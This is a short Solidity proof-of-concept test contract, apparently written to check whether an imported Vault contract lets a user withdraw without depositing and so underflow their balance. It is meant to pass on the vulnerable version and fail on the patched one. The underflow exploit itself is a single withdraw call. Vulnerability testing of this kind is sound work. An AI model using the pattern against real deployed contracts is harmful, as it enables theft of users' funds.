// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/Vault.sol";

// A validated PoC: passes on the vulnerable Vault (the balance underflows),
// and reverts on the patched Vault (withdraw reverts), so it flips polarity.
contract PocUnderflow {
    function testUnderflow() external {
        Vault v = new Vault();
        v.withdraw(1); // never deposited
        require(v.balance(address(this)) > 2 ** 255, "no underflow");
    }
}
